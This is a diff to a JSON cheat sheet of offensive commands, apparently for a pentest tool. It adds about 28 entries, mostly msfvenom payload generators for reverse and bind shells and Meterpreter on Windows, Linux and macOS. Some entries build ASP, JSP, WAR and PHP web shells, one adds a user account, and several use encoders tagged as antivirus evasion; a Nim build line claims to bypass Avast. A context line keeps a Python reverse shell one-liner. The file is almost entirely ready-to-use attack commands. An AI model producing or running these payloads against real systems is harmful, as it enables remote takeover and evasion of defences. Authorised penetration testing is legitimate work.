@@ -142,17 +142,6 @@
   },
   {
     "category": "Exploit",
-    "name": "MSFvenom Reverse Shell (EXE)",
-    "command": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -f exe -o shell.exe",
-    "description": "Generate Windows reverse shell payload",
-    "tags": [
-      "msfvenom",
-      "payload",
-      "windows"
-    ]
-  },
-  {
-    "category": "Exploit",
     "name": "Python Reverse Shell",
     "command": "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"<lhost>\",<lport>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
     "description": "Python3 reverse shell one-liner",
@@ -510,6 +499,350 @@
       "hashcat",
       "wordlist",
       "rules"
+    ]
+  },
+  {
+    "category": "Exploit",
+    "name": "MSFvenom - Windows x64 shell (EXE)",
+    "command": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -f exe -o shell.exe",
+    "description": "Windows x64 single-stage reverse shell EXE",
+    "tags": [
+      "msfvenom",
+      "windows",
+      "x64",
+      "shell",
+      "exe"
+    ]
+  },
+  {
+    "category": "Exploit",
+    "name": "MSFvenom - Windows x64 metershell (EXE)",
+    "command": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<lhost> LPORT=<lport> -f exe -o metershell.exe",
+    "description": "Windows x64 Meterpreter reverse shell EXE",
+    "tags": [
+      "msfvenom",
+      "windows",
+      "x64",
+      "meterpreter",
+      "exe"
+    ]
+  },
+  {
+    "category": "Exploit",
+    "name": "MSFvenom - Windows x64 shell encoded (EXE)",
+    "command": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -e x64/xor_dynamic -f exe -o shell_en.exe",
+    "description": "Windows x64 reverse shell with XOR encoder (AV evasion)",
+    "tags": [
+      "msfvenom",
+      "windows",
+      "x64",
+      "shell",
+      "encoded",
+      "evasion"
+    ]
+  },
+  {
+    "category": "Exploit",
+    "name": "MSFvenom - Windows x64 metershell encoded x5 (EXE)",
+    "command": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<lhost> LPORT=<lport> -e x64/xor_dynamic -i 5 -f exe -o metershell_en.exe",
+    "description": "Windows x64 Meterpreter with XOR encoder x5 iterations (AV evasion)",
+    "tags": [
+      "msfvenom",
+      "windows",
+      "x64",
+      "meterpreter",
+      "encoded",
+      "evasion"
+    ]
+  },
+  {
+    "category": "Exploit",
+    "name": "MSFvenom - Windows x86 metershell shikata (EXE)",
+    "command": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=<lhost> LPORT=<lport> -a x86 -e x86/shikata_ga_nai -f exe -o metershell_en.exe",
+    "description": "Windows x86 Meterpreter with shikata_ga_nai encoder (AV evasion)",
+    "tags": [
+      "msfvenom",
+      "windows",
+      "x86",
+      "meterpreter",
+      "shikata",
+      "encoded",
+      "evasion"
+    ]
+  },
+  {
+    "category": "Exploit",
+    "name": "MSFvenom - Windows x86 metershell (EXE)",
+    "command": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=<lhost> LPORT=<lport> -f exe -o metershell.exe",
+    "description": "Windows x86 multi-stage Meterpreter reverse shell",
+    "tags": [
+      "msfvenom",
+      "windows",
+      "x86",
+      "meterpreter",
+      "exe"
+    ]
+  },
+  {
+    "category": "Exploit",
+    "name": "MSFvenom - Windows x86 metershell bind (EXE)",
+    "command": "msfvenom -p windows/meterpreter/bind_tcp LHOST=<lhost> LPORT=<lport> -f exe -o metershell_bind.exe",
+    "description": "Windows x86 Meterpreter bind shell",
+    "tags": [
+      "msfvenom",
+      "windows",
+      "x86",
+      "meterpreter",
+      "bind"
+    ]
+  },
+  {
+    "category": "Exploit",
+    "name": "MSFvenom - Windows x64 shell (DLL)",
+    "command": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -f dll -o shell.dll",
+    "description": "Windows x64 reverse shell as DLL (DLL hijacking / sideloading)",
+    "tags": [
+      "msfvenom",
+      "windows",
+      "x64",
+      "shell",
+      "dll"
+    ]
+  },
+  {
+    "category": "Exploit",
+    "name": "MSFvenom - Windows shell (MSI)",
+    "command": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -f msi -o installer.msi",
+    "description": "Windows reverse shell as MSI installer",
+    "tags": [
+      "msfvenom",
+      "windows",
+      "shell",
+      "msi"
+    ]
+  },
+  {
+    "category": "Exploit",
+    "name": "MSFvenom - Windows CMD shell multi-stage (EXE)",
+    "command": "msfvenom -p windows/shell/reverse_tcp LHOST=<lhost> LPORT=<lport> -f exe -o shell.exe",
+    "description": "Windows CMD multi-stage reverse shell",
+    "tags": [
+      "msfvenom",
+      "windows",
+      "shell",
+      "exe"
+    ]
+  },
+  {
+    "category": "Exploit",
+    "name": "MSFvenom - Windows add user (EXE)",
+    "command": "msfvenom -p windows/adduser USER=<user> PASS=<password> -f exe -o useradd.exe",
+    "description": "Windows payload to add a local user account",
+    "tags": [
+      "msfvenom",
+      "windows",
+      "adduser",
+      "privesc"
+    ]
+  },
+  {
+    "category": "Exploit",
+    "name": "MSFvenom - Windows ASP metershell",
+    "command": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=<lhost> LPORT=<lport> -f asp -o metershell.asp",
+    "description": "ASP Meterpreter shell (IIS web shell)",
+    "tags": [
+      "msfvenom",
+      "windows",
+      "meterpreter",
+      "asp",
+      "web"
+    ]
+  },
+  {
+    "category": "Exploit",
+    "name": "MSFvenom - Linux x86 metershell (ELF)",
+    "command": "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<lhost> LPORT=<lport> -f elf -o metershell.elf",
+    "description": "Linux x86 multi-stage Meterpreter reverse shell",
+    "tags": [
+      "msfvenom",
+      "linux",
+      "x86",
+      "meterpreter",
+      "elf"
+    ]
+  },
+  {
+    "category": "Exploit",
+    "name": "MSFvenom - Linux x86 metershell bind (ELF)",
+    "command": "msfvenom -p linux/x86/meterpreter/bind_tcp LHOST=<lhost> LPORT=<lport> -f elf -o metershell_bind.elf",
+    "description": "Linux x86 Meterpreter bind shell",
+    "tags": [
+      "msfvenom",
+      "linux",
+      "x86",
+      "meterpreter",
+      "bind",
+      "elf"
+    ]
+  },
+  {
+    "category": "Exploit",
+    "name": "MSFvenom - Linux x64 shell (ELF)",
+    "command": "msfvenom -p linux/x64/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -f elf -o shell.elf",
+    "description": "Linux x64 single-stage reverse shell",
+    "tags": [
+      "msfvenom",
+      "linux",
+      "x64",
+      "shell",
+      "elf"
+    ]
+  },
+  {
+    "category": "Exploit",
+    "name": "MSFvenom - Linux x64 shell bind (ELF)",
+    "command": "msfvenom -p linux/x64/shell_bind_tcp LHOST=<lhost> LPORT=<lport> -f elf -o shell_bind.elf",
+    "description": "Linux x64 single-stage bind shell",
+    "tags": [
+      "msfvenom",
+      "linux",
+      "x64",
+      "shell",
+      "bind",
+      "elf"
+    ]
+  },
+  {
+    "category": "Exploit",
+    "name": "MSFvenom - Tomcat shell (WAR)",
+    "command": "msfvenom -p java/jsp_shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -f war -o shell.war",
+    "description": "Java JSP reverse shell WAR — upload to Apache Tomcat",
+    "tags": [
+      "msfvenom",
+      "java",
+      "tomcat",
+      "shell",
+      "war",
+      "web"
+    ]
+  },
+  {
+    "category": "Exploit",
+    "name": "MSFvenom - JSP shell (RAW)",
+    "command": "msfvenom -p java/jsp_shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -f raw -o shell.jsp",
+    "description": "Java JSP reverse shell raw file",
+    "tags": [
+      "msfvenom",
+      "java",
+      "shell",
+      "jsp",
+      "web"
+    ]
+  },
+  {
+    "category": "Exploit",
+    "name": "MSFvenom - PHP shell",
+    "command": "msfvenom -p php/reverse_php LHOST=<lhost> LPORT=<lport> -f raw -o shell.php",
+    "description": "PHP reverse shell payload",
+    "tags": [
+      "msfvenom",
+      "php",
+      "shell",
+      "web"
+    ]
+  },
+  {
+    "category": "Exploit",
+    "name": "MSFvenom - macOS shell (Macho)",
+    "command": "msfvenom -p osx/x86/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -f macho -o shell.macho",
+    "description": "macOS x86 reverse shell Mach-O binary",
+    "tags": [
+      "msfvenom",
+      "macos",
+      "shell",
+      "macho"
+    ]
+  },
+  {
+    "category": "Exploit",
+    "name": "MSFvenom - macOS shell bind (Macho)",
+    "command": "msfvenom -p osx/x86/shell_bind_tcp LHOST=<lhost> LPORT=<lport> -f macho -o shell_bind.macho",
+    "description": "macOS x86 bind shell Mach-O binary",
+    "tags": [
+      "msfvenom",
+      "macos",
+      "shell",
+      "bind",
+      "macho"
+    ]
+  },
+  {
+    "category": "Exploit",
+    "name": "MSFvenom - Python shell",
+    "command": "msfvenom -p cmd/unix/reverse_python LHOST=<lhost> LPORT=<lport> -f raw -o shell.py",
+    "description": "Python reverse shell one-liner script",
+    "tags": [
+      "msfvenom",
+      "python",
+      "shell",
+      "unix"
+    ]
+  },
+  {
+    "category": "Exploit",
+    "name": "MSFvenom - Bash shell",
+    "command": "msfvenom -p cmd/unix/reverse_bash LHOST=<lhost> LPORT=<lport> -f raw -o shell.sh",
+    "description": "Bash reverse shell script",
+    "tags": [
+      "msfvenom",
+      "bash",
+      "shell",
+      "unix"
+    ]
+  },
+  {
+    "category": "Exploit",
+    "name": "MSFvenom - Perl shell",
+    "command": "msfvenom -p cmd/unix/reverse_perl LHOST=<lhost> LPORT=<lport> -f raw -o shell.pl",
+    "description": "Perl reverse shell script",
+    "tags": [
+      "msfvenom",
+      "perl",
+      "shell",
+      "unix"
+    ]
+  },
+  {
+    "category": "Exploit",
+    "name": "MSFvenom - List payloads",
+    "command": "msfvenom -l payloads",
+    "description": "List all available msfvenom payloads",
+    "tags": [
+      "msfvenom",
+      "reference"
+    ]
+  },
+  {
+    "category": "Exploit",
+    "name": "MSFvenom - List payload options",
+    "command": "msfvenom -p <payload> --list-options",
+    "description": "Show all options for a specific payload",
+    "tags": [
+      "msfvenom",
+      "reference"
+    ]
+  },
+  {
+    "category": "Exploit",
+    "name": "Nim - Windows shell (AV evasion)",
+    "command": "nim c -d:mingw --app:gui -o:shell.exe rev_shell.nim",
+    "description": "Compile Nim reverse shell EXE — bypasses Avast/common AV",
+    "tags": [
+      "nim",
+      "windows",
+      "shell",
+      "evasion",
+      "av"
     ]
   }
 ]
